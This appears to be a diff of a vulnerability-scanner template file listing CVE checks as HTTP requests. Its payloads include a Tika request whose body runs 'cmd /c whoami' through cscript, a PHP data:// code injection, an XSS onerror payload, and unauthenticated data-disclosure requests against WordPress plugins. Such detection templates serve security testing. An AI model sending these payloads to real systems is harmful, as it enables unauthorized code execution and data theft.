@@ -6786,11 +6786,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -19347,8 +19347,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?p=1&xsg-provider=data://text/html,%3C?php%20phpinfo();%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp",
-            "{{BaseURL}}/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp"
+            "{{BaseURL}}/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp",
+            "{{BaseURL}}/?p=1&xsg-provider=data://text/html,<?php%20echo%20md5(\"CVE-2022-0346\");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp"
           ]
         }
       ]
@@ -20120,6 +20120,21 @@
       ]
     },
     {
+      "id": "CVE-2022-1442",
+      "info": {
+        "name": "WordPress Plugin Metform <= 2.1.3 - Unauthenticated Sensitive Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wp-json/metform/v1/forms/templates/0 HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-json/metform/v1/forms/get/{{id}} HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1574",
       "info": {
         "name": "WordPress HTML2WP <=1.0.0 - Arbitrary File Upload",
@@ -20649,6 +20664,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/themes"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-2379",
+      "info": {
+        "name": "Easy Student Results <= 2.2.8 - Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wp-json/rps_result/v1/route/student_fields HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-json/rps_result/v1/route/search_student?department_id=1&batch_id=1 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
